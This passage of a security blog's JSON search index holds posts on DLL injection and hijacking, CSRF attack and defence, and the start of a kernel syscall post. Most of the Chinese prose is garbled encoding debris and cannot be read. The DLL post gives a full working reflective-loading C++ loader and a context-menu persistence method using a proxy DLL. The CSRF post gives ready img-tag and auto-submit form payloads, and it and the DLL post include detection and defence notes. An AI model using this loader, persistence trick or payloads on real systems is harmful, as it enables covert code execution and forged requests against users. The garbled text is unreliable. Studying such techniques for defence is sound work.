¸å¿ƒéƒ¨åˆ†ï¼Œæ•ˆæœæ˜¯æ‰§è¡Œç¨‹åºä»¥attachè¿›å…¥dllå…¥å£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 #include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt; typedef struct BASE_RELOCATION_BLOCK { DWORD PageAddress; DWORD BlockSize; } BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK; typedef struct BASE_RELOCATION_ENTRY { USHORT Offset : 12; USHORT Type : 4; } BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY; using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved); int main() { // get this module\u0026#39;s image base address PVOID imageBase = GetModuleHandleA(NULL); // load DLL into memory HANDLE dll = CreateFileA(\u0026#34;APCDLL.dll\u0026#34;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL); DWORD64 dllSize = GetFileSize(dll, NULL); LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize); DWORD outSize = 0; ReadFile(dll, dllBytes, dllSize, \u0026amp;outSize, NULL); // get pointers to in-memory DLL headers PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-\u0026gt;e_lfanew); SIZE_T dllImageSize = ntHeaders-\u0026gt;OptionalHeader.SizeOfImage; // allocate new memory space for the DLL. Try to allocate memory in the image\u0026#39;s preferred base address, but don\u0026#39;t stress if the memory is allocated elsewhere //LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders-\u0026gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // get delta between this module\u0026#39;s image base and the DLL that was read into memory DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-\u0026gt;OptionalHeader.ImageBase; // copy over DLL image headers to the newly allocated space for the DLL std::memcpy(dllBase, dllBytes, ntHeaders-\u0026gt;OptionalHeader.SizeOfHeaders); // copy over DLL image sections to the newly allocated space for the DLL PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders); for (size_t i = 0; i \u0026lt; ntHeaders-\u0026gt;FileHeader.NumberOfSections; i++) { LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-\u0026gt;VirtualAddress); LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-\u0026gt;PointerToRawData); std::memcpy(sectionDestination, sectionBytes, section-\u0026gt;SizeOfRawData); section++; } // perform image base relocations IMAGE_DATA_DIRECTORY relocations = ntHeaders-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase; DWORD relocationsProcessed = 0; while (relocationsProcessed \u0026lt; relocations.Size) { PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed); relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK); DWORD relocationsCount = (relocationBlock-\u0026gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY); PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed); for (DWORD i = 0; i \u0026lt; relocationsCount; i++) { relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY); if (relocationEntries[i].Type == 0) { continue; } DWORD_PTR relocationRVA = relocationBlock-\u0026gt;PageAddress + relocationEntries[i].Offset; DWORD_PTR addressToPatch = 0; ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), \u0026amp;addressToPatch, sizeof(DWORD_PTR), NULL); addressToPatch += deltaImageBase; std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), \u0026amp;addressToPatch, sizeof(DWORD_PTR)); } } // resolve import address table PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL; IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase); LPCSTR libraryName = \u0026#34;\u0026#34;; HMODULE library = NULL; while (importDescriptor-\u0026gt;Name != NULL) { libraryName = (LPCSTR)importDescriptor-\u0026gt;Name + (DWORD_PTR)dllBase; library = LoadLibraryA(libraryName); if (library) { PIMAGE_THUNK_DATA thunk = NULL; thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-\u0026gt;FirstThunk); while (thunk-\u0026gt;u1.AddressOfData != NULL) { if (IMAGE_SNAP_BY_ORDINAL(thunk-\u0026gt;u1.Ordinal)) { LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk-\u0026gt;u1.Ordinal); thunk-\u0026gt;u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal); } else { PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-\u0026gt;u1.AddressOfData); DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName-\u0026gt;Name); thunk-\u0026gt;u1.Function = functionAddress; } ++thunk; } } importDescriptor++; } // execute the loaded DLL DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-\u0026gt;OptionalHeader.AddressOfEntryPoint); (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0); CloseHandle(dll); HeapFree(GetProcessHeap(), 0, dllBytes); return 0; } Reflection DLL Injectionå¯ä»¥ç”¨ volatilityæ’ä»¶malfindæ£€æµ‹\n1 volatility -f /mnt/memdumps/w7-reflective-dll.bin malfind --profile Win7SP1x64 Dll hijacking\u0026amp;proxying dllä»£ç†æ˜¯ç‰¹æ®Šçš„dllåŠ«æŒï¼Œå…¶åŸç†å›¾å¦‚ä¸‹ï¼Œæœ¬è´¨æ˜¯ä¸ªwrapperï¼Œå°†æ­£å¸¸çš„æ‰§è¡Œé‡å®šå‘åˆ°çœŸçš„dllï¼Œç„¶åwrapperæ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œloadçš„æ—¶å€™ç¨‹åºå…ˆload proxyï¼Œproxyå†load real dllã€‚\nDLL Proxying is achieved through a DLL Wrapper. The idea is very simple and quite self-explanatory at this point. A DLL Wrapper consists in redirecting all the functions to the original DLL using forwarders. In a typical DLL, the Export Table contains a list of addresses that point to the code of each exported function inside the PE file. But, there is a second option: it can also contain Forwarders. Instead of referencing some code inside the DLL itself, a Forwarder points to a string, which gives the name (or the ordinal number) of the exported function and the name of the DLL in which it can be found (e.g.: FOO.DummyFunction or FOO.#47). This feature is exactly what we need in order to transparently redirect all the functions to the orignal DLL as described on this diagram.\nContext menu Persistance å› ä¸ºContext menuè‡ªåŠ¨è¿è¡Œçš„ç‰¹å¾ï¼Œé€šè¿‡explorer.exeåŠ è½½çš„dllå¯ä»¥å®ç°æŒä¹…åŒ–\nä½¿ç”¨Sysinternalsä¸­ç¨‹åºAutorunså¯ä»¥çœ‹åˆ°ContextMenuåŠ è½½çš„dll\nåˆ›å»ºä¸€ä¸ªproxy dll https://github.com/rek7/dll-hijacking\n1 python parse.py -d 7-zip.dll ç”Ÿæˆå¤´æ–‡ä»¶ä¿å­˜åœ¨definitions.hä¸­ï¼Œåªè¦å®ç°dllmain.cppç„¶åç¼–è¯‘å‡ºdllå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 PS C:\\Program Files\\7-Zip\u0026gt; ls ç›®å½•: C:\\Program Files\\7-Zip Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 2022/1/20 21:10 Lang -a--- 2021/12/27 18:00 112890 7-zip.chm -a--- 2022/1/20 21:40 58880 7-zip.dll -a--- 2021/12/26 22:00 62976 7-zip32.dll -a--- 2021/12/26 22:00 93696 7-zip_.dll -a--- 2021/12/26 22:00 1710080 7z.dll -a--- 2021/12/26 22:00 535040 7z.exe -a--- 2021/12/26 22:00 215040 7z.sfx -a--- 2021/12/26 22:00 193536 7zCon.sfx -a--- 2021/12/26 22:00 945664 7zFM.exe -a--- 2021/12/26 22:00 667136 7zG.exe -a--- 2018/1/28 17:00 366 descript.ion -a--- 2021/12/27 16:52 54604 History.txt -a--- 2021/1/17 23:12 3990 License.txt -a--- 2021/12/26 21:54 1702 readme.txt -a--- 2021/12/26 22:00 14848 Uninstall.exe PS C:\\Program Files\\7-Zip\u0026gt; ç»æµ‹è¯•ç¼–è¯‘å‡ºæ¥åœ¨æœ¬æœºwin10å¯ä»¥ä»£ç†æˆåŠŸï¼Œæ¢åˆ°win7ä¸èƒ½ï¼Œåº”è¯¥æ˜¯winæ¥å£å˜äº†å§ã€‚\nrefer https://uknowsec.cn/archives/ https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html https://blog.raphael.karger.is/articles/2020-03/context-menu-persistance [context-menu-persistance]\nhttps://www.cnblogs.com/wf751620780/p/10730013.html#autoid-4-3-0 [dll hijacking]\nhttps://github.com/rek7/dll-hijacking [dll hijacking]\nhttps://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks [dll hijacking]\nhttps://itm4n.github.io/dll-proxying/ [dll proxying]\nhttps://docs.microsoft.com/en-us/sysinternals/downloads/autoruns [autoruns.exe]\nhttps://blog.csdn.net/yuyan987/article/details/78558648 [message box]\nhttps://www.cnblogs.com/wf751620780/p/10730013.html [dll injection]\nhttps://blog.csdn.net/Cody_Ren/article/details/100053434 [dll injection]\nhttps://github.com/theevilbit/injection [injections demo]\nhttps://422926799.github.io/posts/9a523925.html [image hijack]\nhttps://docs.microsoft.com/zh-cn/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022 [sys symbol]\nhttps://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot [CreateToolhelp32Snapshot]\nhttps://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex [CreateRemoteThreadEx api]\nhttps://blog.csdn.net/Cody_Ren/article/details/100041660 [CreateRemoteThreadEx]\nhttps://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection [ReflectiveDLLInjection]\nhttps://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal [vol malfind]\nhttps://blog.csdn.net/weixin_43956962/article/details/105843803 [RDI]\nhttps://github.com/stephenfewer/ReflectiveDLLInjection [RDI]\nhttps://bbs.pediy.com/thread-260235.htm#msg_header_h1_0 [RDI analyze]\nhttps://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-address-table [PE format]\nhttps://www.apriorit.com/dev-blog/536-detecting-hook-and-rop-attacks [detect hook\u0026amp;ROP Attacks]\n","description":"","id":19,"section":"posts","tags":["red team","windows"],"title":"DLLæ³¨å…¥åŠDLLåŠ«æŒç®€å•å­¦ä¹ ","uri":"https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/"},{"content":"å‰è¨€ CSRFçš„é˜²æŠ¤ä¸»è¦æ€æƒ³å°±æ˜¯ä¿è¯è¯·æ±‚æ˜¯ä»æ­£ç¡®çš„ç½‘ç«™å‘å‡ºçš„ã€‚\nCSRFæ”»å‡» æ”»å‡»åŸç†å›¾å¦‚ä¸‹ï¼Œå›¾ç‰‡æ¥è‡ª[1]\nGETå‹æ”»å‡» getå‹æ”»å‡»ä»…éœ€ä¼ªé€ ä¸€æ¬¡getè¯·æ±‚å³å¯ï¼Œå±å®³ç¨‹åº¦å¤§\n1 \u0026lt;img src=http://www.mybank.com/Transfer.php?toBankId=11\u0026amp;money=1000\u0026gt; POSTå‹æ”»å‡» 1 2 3 4 \u0026lt;form action=http://wooyun.org/csrf.php method=POST\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;xx\u0026#34; value=\u0026#34;11\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; CSRFæ£€æµ‹ CSRFTester æºç é˜…è¯»ï¼šå…¥å£ç±»ä¸ºCSRFTesterï¼Œæ„é€ å‡½æ•°åˆ›å»ºUIï¼Œmainä¸­åˆ›å»ºproxyï¼ŒProxy(new Framework()).run()\nCSRFé˜²å¾¡ referer ç½‘ç«™Bå‘å‡ºçš„è¯·æ±‚refererä¸ºç½‘ç«™Bï¼Œåªéœ€åœ¨åç«¯åˆ¤æ–­refereræ˜¯å¦åŒç«™å³å¯é˜²å¾¡CSRFã€‚è¿™æ ·ç›¸å½“äºæŠŠå®‰å…¨å¯„æ‰˜äºç¬¬ä¸‰æ–¹ï¼Œå› ä¸ºæµè§ˆå™¨éƒ½ä¸æ”¯æŒjså¯¹refererå¤´çš„ä¿®æ”¹[4]\u0026amp;[5]ï¼Œæœ‰çš„æ–‡ç« [6]è¯´å¯ä»¥ä½¿ç”¨axiosè¿›è¡Œrefererç»•è¿‡ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•åå¹¶ä¸è¡Œã€‚\nRefused to set unsafe header \u0026#34;referer\u0026#34; jsä¸å…è®¸ä¿®æ”¹refererå¤´ï¼Œä½†æ˜¯hackbarå¯ä»¥æ·»åŠ ä»»æ„å¤´ï¼Œæ˜¯å¦‚ä½•å®ç°çš„å‘¢ã€‚\nHackbaræºç é˜…è¯» æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢chromeæ’ä»¶idå°±å¾ˆå®¹æ˜“æ‰¾åˆ°è§£åŒ…åæºç çš„ä½ç½®ï¼Œå¯ä»¥å‘ç°è¿Hackbaréƒ½æ˜¯å¤§åé¼é¼çš„vueå†™çš„ã€‚\næœç´¢refererå¯ä»¥åœ¨index.jsä¸­çœ‹åˆ°commonRequestHeadersçš„å‡½æ•°åˆ—å‡ºå¸¸è§çš„requestå¤´\nå‘ç°ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼Œå°±æ˜¯é€šè¿‡v-modelåŠ¨æ€ç»‘å®švueå¯¹è±¡dataæ•°æ®ä¸­headersä¸­çš„å€¼\n1 2 3 4 5 6 7 8 9 10 \u0026lt;v-btn id=\u0026#34;add-header-button\u0026#34; @click=\u0026#34;addHeader()\u0026#34;\u0026gt;Add Header\u0026lt;/v-btn\u0026gt; \u0026lt;v-layout class=\u0026#34;header-settings\u0026#34; align-center v-for=\u0026#34;(header, index) in request.headers\u0026#34; :key=\u0026#34;index\u0026#34;\u0026gt; \u0026lt;v-checkbox v-model=\u0026#34;header.enabled\u0026#34;\u0026gt;\u0026lt;/v-checkbox\u0026gt; \u0026lt;v-combobox dense class=\u0026#34;px-1 pt-2\u0026#34; label=\u0026#34;Name\u0026#34; v-model=\u0026#34;header.name\u0026#34; :items=\u0026#34;commonRequestHeaders()\u0026#34; @focus=\u0026#34;onFocus($event)\u0026#34; :menu-props=\u0026#39;{ \u0026#34;maxHeight\u0026#34;: 200 }\u0026#39;\u0026gt;\u0026lt;/v-combobox\u0026gt; \u0026lt;v-text-field class=\u0026#34;px-1\u0026#34; label=\u0026#34;Value\u0026#34; v-model=\u0026#34;header.value\u0026#34; @focus=\u0026#34;onFocus($event)\u0026#34; @keydown.stop\u0026gt;\u0026lt;/v-text-field\u0026gt; \u0026lt;v-btn icon text @click=\u0026#34;deleteHeader(index)\u0026#34;\u0026gt; \u0026lt;v-icon small\u0026gt;mdi-close\u0026lt;/v-icon\u0026gt; \u0026lt;/v-btn\u0026gt; \u0026lt;/v-layout\u0026gt; headersåªæ˜¯å­˜å‚¨æ•°æ®ï¼Œæ‰§è¡Œæ—¶è°ƒç”¨chrome.runtime.connect()è¿™ä¸ªæ¥å£ï¼Œä»–çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯extension idã€‚\nThe ID of the extension or app to connect to. If omitted, a connection will be attempted with your own extension. Required if sending messages from a web page for web messaging.[7]\n1 2 3 4 5 6 7 8 9 10 11 12 13 this.backgroundPageConnection = chrome.runtime.connect() ... execute: function () { if (this.request.url.length === 0) { return } this.backgroundPageConnection.postMessage({ tabId: chrome.devtools.inspectedWindow.tabId, type: \u0026#39;execute\u0026#39;, data: this.request }) }, åˆ°è¿™é‡Œå¯ä»¥çŸ¥é“äº†ï¼Œhackbarä½¿ç”¨çš„æ˜¯æµè§ˆå™¨æä¾›çš„æ‰©å±•ç¨‹åºæ¥å£ï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹header\ncsrf token ä¹Ÿæ­£æ˜¯ç”±äºCSRFäº§ç”Ÿçš„åŸç†ï¼Œcsrf_tokenä¸èƒ½æ”¾åœ¨cookieä¸­ï¼Œå¦åˆ™è¾¾ä¸åˆ°é˜²å¾¡CSRFçš„æ•ˆæœï¼›csrf_tokenä¹Ÿæ— éœ€æ¯æ¬¡éƒ½ä¸ä¸€æ ·(æ¯æ¬¡ä¸åŒæ˜¯é˜²æ­¢é‡æ”¾æ”»å‡»ï¼Œè‹¥ä»…è€ƒè™‘CSRFåˆ™æ— éœ€ä¸åŒ)ã€‚\nä¸€èˆ¬formè¡¨å•åŠ ä¸ªhiddenå±æ€§çš„inputæ ‡ç­¾æ¥å­˜æ”¾ã€‚ç”±äºcsrf_tokenå­˜æ”¾åœ¨ç½‘ç«™Açš„DOMä¸­ï¼Œè¿™æ ·ç½‘ç«™Bå°±æ— æ³•è·å–tokenï¼Œå³ä½¿ä¼ªé€ ä½¿å¾—æµé‡å™¨è®¿é—®ç½‘ç«™Aï¼ŒAåç«¯æ£€æµ‹åˆ°æ²¡æœ‰tokenä¹Ÿä¸ä¼šå…è®¸è¯·æ±‚ã€‚\nè‡³äºhiddenè¿™ä¸ªå±æ€§ï¼Œä¸ªäººè®¤ä¸ºå³ä½¿æ˜¯æ˜æ–‡ä¹Ÿä¸å½±å“å¯¹CSRFçš„é˜²å¾¡ï¼Œä¸»è¦æ˜¯å‡å°‘ç”¨æˆ·æ„ŸçŸ¥ã€‚\n1 2 3 4 5 6 7 8 \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;{{csrf_token()}}\u0026#34;\u0026gt; è´¦å·ï¼š\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; å¯†ç :\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;æäº¤\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; csrf_tokençš„è®¾è®¡ï¼šåŸºäºæ”»å‡»è€…æ— æ³•å¾—çŸ¥cookieï¼Œæœ€ç®€å•çš„å¯ç›´æ¥å°†sessionidç­‰ä½œä¸ºtoken(md5å€¼ç­‰åŒç†)ï¼›æˆ–è€…ç›´æ¥ç”Ÿæˆéšæœºå­—ç¬¦ä¸²\næ·»åŠ http requestå¤´ æ·»åŠ é¢å¤–çš„ HTTP å¤´å±æ€§ï¼Œå¹¶æŠŠ token å€¼æ”¾å…¥å…¶ä¸­ï¼Œæ¯”å¦‚å« csrftoken\nä»åº•å±‚åˆ°é«˜å±‚XMLHttpRequestã€Ajaxã€ Axiosç­‰éƒ½æ”¯æŒæ‰‹åŠ¨æ·»åŠ headerå¤´ï¼Œè¾ƒæ–¹ä¾¿ã€‚ä¸ªäººè®¤ä¸ºä¸å­˜åœ¨[1]ä¸­æè¿°çš„å±€é™æ€§è¾ƒå¤§çš„é—®é¢˜ã€‚\næ·»åŠ éªŒè¯æœºåˆ¶ åœ¨è¯·æ±‚æ•°æ®æäº¤å‰ï¼Œéœ€å¡«å†™éªŒè¯ç ä¿¡æ¯ï¼Œä»¥å¢åŠ å¯¹ç”¨æˆ·æ¥æºçš„æœ‰æ•ˆè®¤è¯ï¼Œé˜²æ­¢æ¶æ„æœªæˆæƒçš„æ“ä½œäº§ç”Ÿã€‚\nFlask CSRF Strategy å¦‚æœæ²¡æœ‰æŒ‡å®šå…è®¸POSTï¼Œæäº¤è¡¨å•çš„æ—¶å€™ä¼šæç¤ºMethod Not Allowed\n1 2 3 4 5 6 7 8 9 10 @app.route(\u0026#39;/\u0026#39;) def root(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;form.html\u0026#34;) else: print(request.form) return \u0026#34;ok\u0026#34; ======================================== Method Not Allowed The method is not allowed for the requested URL. å¦‚æœå…è®¸äº†POSTï¼Œå†æ¬¡å°è¯•æäº¤è¡¨å•ä¼šBad Requestï¼Œè¿™ä¹Ÿæ˜¯CSRFæ”»å‡»æœªæºå¸¦tokençš„åœºæ™¯\n1 2 3 4 5 6 7 8 9 10 @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def root(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;form.html\u0026#34;) else: print(request.form) return \u0026#34;ok\u0026#34; ======================================== Bad Request The CSRF token is missing. å¦‚æœtemplateä¸­æ·»åŠ tokenï¼Œåœ¨è®¿é—®ç½‘ç«™çš„æ—¶å€™è¯·æ±‚åˆ°tokenï¼Œç„¶åæäº¤è¡¨å•çš„æ—¶å€™å°†tokenä¹Ÿpostå‡ºå»ï¼Œè¿™æ ·å°±èƒ½æ­£ç¡®å“åº”ã€‚å°è¯•æ‰‹åŠ¨ä¿®æ”¹DOMä¸­çš„tokenå†æ¬¡postä¹Ÿæ˜¯bad requestã€‚\n1 2 3 4 5 6 7 8 \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;{{ csrf_token() }}\u0026#34;\u0026gt; è´¦å·:\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; å¯†ç :\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;æäº¤\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; æºç åˆ†æ https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py\nCSRFProtectç±»ä¸­init_appåˆå§‹å…ˆå¯¹appè¿›è¡Œä¸€äº›å‚æ•°çš„é…ç½®å¹¶ç”¨generate_csrfæ–¹æ³•è·å–éšæœºtokenå¹¶ä¿å­˜åˆ°sessionä¸­ï¼›ç„¶åå¯¹appæ·»åŠ @app.before_requestçš„hookï¼Œè¯·æ±‚æ¥æ—¶å…ˆæ£€æµ‹appçš„å‚æ•°é…ç½®ï¼Œä¸ç¬¦åˆç›´æ¥returnï¼Œç„¶åè¿›åˆ°protectæ–¹æ³•ï¼Œå…¶ä¸­å…ˆvalidate_csrf(self._get_csrf_token())æ£€æµ‹tokenæ˜¯å¦ä¸sessionä¸­ä¸€è‡´å†ä½¿ç”¨same_originæ–¹æ³•æ£€æµ‹referreræ˜¯å¦åŒæºï¼Œå¦‚æœæ˜¯æœ€åå†è¡¨ç¤ºè¯·æ±‚æ˜¯CSRF valid\nå‚è€ƒæ–‡çŒ® [1] https://www.cnblogs.com/54chensongxia/p/11693666.html [csrf]\n[2] https://www.cnblogs.com/leijiangtao/p/11770647.html [flask csrf]\n[3] http://luckyzmj.cn/posts/a1b686d3.html#! [CSRFTester]\n[4] https://blog.csdn.net/neal1991/article/details/114609935 [js referer]\n[5] https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name [forbidden header name]\n[6] https://blog.csdn.net/Forever201295/article/details/80237134 [axios referer forgery]\n[7] https://developer.chrome.com/docs/extensions/reference/runtime/#method-connect [runtime.connect]\n[8] https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html [attack csrftester]\n[9] https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py [flask csrf source code]\n","description":"","id":20,"section":"posts","tags":["web","csrf"],"title":"CSRFæ”»å‡»é˜²å¾¡/Hackbaræ”»å‡»åŸç†åŠFlaské˜²å¾¡ç­–ç•¥ç ”ç©¶","uri":"https://ruokeqx.gitee.io/posts/csrfad/"},{"content":"å‰è¨€ æ“ä½œç³»ç»Ÿè¯¾è®¾ä¸Šæ¥å°±æ˜¯è¿œå¤ç‰ˆæœ¬2.4kernelï¼ŒåŸåœ°æ€€ç–‘é¢˜ç›®æ˜¯ä¸æ˜¯å¤ç”¨äº†åå¤šå¹´äº†ã€‚è™½ç„¶ç–¯ç‹‚åæ§½ è¿˜æ˜¯æƒ³ç¼–è¯‘è¯•è¯•çœ‹.\nè¦æ±‚æ·»åŠ ç³»ç»Ÿè°ƒç”¨ï¼Œæƒ³ç€æ˜¯å‡†å¤‡åšä¸€ä¸ªå†…æ ¸æµé‡æ•è·çš„ç®€å•å·¥å…·ï¼Œäºæ˜¯ç®€å•çš„äº†è§£äº†ä¸€ä¸‹æ•è·æµé‡çš„æ–¹æ³•ï¼Œçœ‹äº†ä¸€ä¸‹libpcapå’Œtcpdumpçš„æºç ï¼Œäº†è§£äº†mapped memoryå’Œring bufferçš„ä½¿ç”¨ç›´æ¥ä»ç½‘å¡é©±åŠ¨æ‘˜ä¸‹æµé‡æå¤§å‡å°‘ç³»ç»Ÿè´Ÿè½½ï¼Œä½†æ˜¯ç”±äºäº‹ä»¶ä»“ä¿ƒï¼Œæœ€åå´åªæ˜¯è‰è‰åœ°å†™äº†ä¸ªç®€å•çš„ç³»ç»Ÿè°ƒç”¨ç‰ˆæœ¬å¹¶ç¼–è¯‘è¿›å†…æ ¸ä½¿ç”¨qemuè°ƒè¯•é…åˆpingè¿›è¡Œæµ‹è¯•ã€‚\nBegin è¦å¢åŠ å¯¹æŸéƒ¨åˆ†åŠŸèƒ½çš„æ”¯æŒï¼Œæ¯”å¦‚ç½‘ç»œä¹‹ç±»ï¼Œå¯ä»¥æŠŠç›¸åº”éƒ¨åˆ†ç¼–è¯‘åˆ°å†…æ ¸ä¸­ï¼ˆbuild-inï¼‰ï¼Œä¹Ÿå¯ä»¥æŠŠè¯¥éƒ¨åˆ†ç¼–è¯‘æˆæ¨¡å—ï¼ˆmoduleï¼‰ï¼ŒåŠ¨æ€è°ƒç”¨ã€‚å¦‚æœç¼–è¯‘åˆ°å†…æ ¸ä¸­ï¼Œåœ¨å†…æ ¸å¯åŠ¨æ—¶å°±å¯ä»¥è‡ªåŠ¨æ”¯æŒç›¸åº”éƒ¨åˆ†çš„åŠŸèƒ½ï¼Œè¿™æ ·çš„ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ã€é€Ÿåº¦å¿«ï¼Œæœºå™¨ä¸€å¯åŠ¨ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨è¿™éƒ¨åˆ†åŠŸèƒ½äº†ï¼›ç¼ºç‚¹æ˜¯ä¼šä½¿å†…æ ¸å˜å¾—åºå¤§èµ·æ¥ï¼Œä¸ç®¡ä½ æ˜¯å¦éœ€è¦è¿™éƒ¨åˆ†åŠŸèƒ½ï¼Œå®ƒéƒ½ä¼šå­˜åœ¨ï¼Œå»ºè®®ç»å¸¸ä½¿ç”¨çš„éƒ¨åˆ†ç›´æ¥ç¼–è¯‘åˆ°å†…æ ¸ä¸­ï¼Œæ¯”å¦‚ç½‘å¡ã€‚å¦‚æœç¼–è¯‘æˆæ¨¡å—ï¼Œå°±ä¼šç”Ÿæˆå¯¹åº”çš„.oæ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™å¯ä»¥åŠ¨æ€åŠ è½½ï¼Œä¼˜ç‚¹æ˜¯ä¸ä¼šä½¿å†…æ ¸è¿‡åˆ†åºå¤§ï¼Œç¼ºç‚¹æ˜¯ä½ å¾—è‡ªå·±æ¥è°ƒç”¨è¿™äº›æ¨¡å—ã€‚\nç¯å¢ƒ\n1 Linux ruokeqx 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å…‹éš†å†…æ ¸æºç 